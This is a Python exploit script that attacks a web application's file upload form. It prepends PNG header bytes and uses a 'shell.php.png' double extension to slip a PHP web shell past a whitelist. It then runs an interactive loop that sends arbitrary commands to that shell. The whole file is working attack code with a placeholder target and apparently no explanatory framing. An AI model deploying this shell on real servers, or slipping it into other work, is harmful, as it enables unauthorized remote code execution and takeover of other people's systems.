import requests, sys, urllib, re


# urls to use for webshell we will upload and for the shell to upload
url = '<TARGET-IP>'
upload_url = url + 'upload.php?id=shell'
webshell_url = url + 'upload/shell.php'
 
# request s for the website
session = requests.Session()
session.get(url, verify=False)


# png bytes to bypass whitelist
png_bytes = '\x89\x50\x4e\x47\x0d\x0a\x1a'
 
# parameters for the post request
png = {'file':
        (
            'shell.php.png',
            png_bytes + '\n' + '<?php echo shell_exec($_GET["telepathy"]); ?>',
            'image/png',
            {'Content-Disposition' : 'form-data'}
        )}
fdata = {'pupload': 'upload'}
 
# create post request to upload url with webshell as param
post_shell = session.post(url=upload_url, files=png, data=fdata, verify=False)
print(post_shell)


# Get uploaded webshell
try:
    print("starting........")
    get_directory = {'telepathy': 'echo %CD%'}
    get_shell = session.get(webshell_url, params=get_directory, verify=False)
    # checks response status from get request
    response_status = get_shell.status_code
    if response_status != 200:
        print("Could not connect to webshell")
        get_shell.raise_for_status()
    
    cwd = re.findall('[CDEF].*', get_shell.text)
    term = cwd[0] + ">"
    while True:
        command = {'telepathy': input(term)}
        webshell = requests.get(webshell_url, params=command, verify=False)
        status = webshell.status_code
        if status != 200:
            webshell.raise_for_status()
        webshell_response = webshell.text
        print(webshell_response)
except:
    print("\nExit....")
    sys.exit(-1)

